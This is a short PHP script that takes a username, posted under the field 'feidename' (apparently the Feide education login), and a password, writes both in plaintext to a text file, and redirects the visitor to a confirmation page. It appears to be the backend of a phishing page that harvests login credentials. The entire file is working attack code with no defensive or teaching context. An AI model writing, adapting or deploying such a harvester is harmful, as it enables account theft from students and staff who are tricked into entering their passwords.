<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the username and password from the POST request
$username = $_POST['feidename'] ?? 'No username provided';
$password = $_POST['password'] ?? 'No password provided';

// Define the absolute path to the file
$filePath = '/path/to/your/directory/usernames.txt';

// Log the credentials to a file
if (file_put_contents($filePath, "Username: " . $username . " Password: " . $password . "\n", FILE_APPEND) === false) {
    echo "Failed to write to file.";
} else {
    echo "Credentials saved successfully.";
}

// Redirect to a confirmation page
header('Location: confirmation.html');
exit();
?>
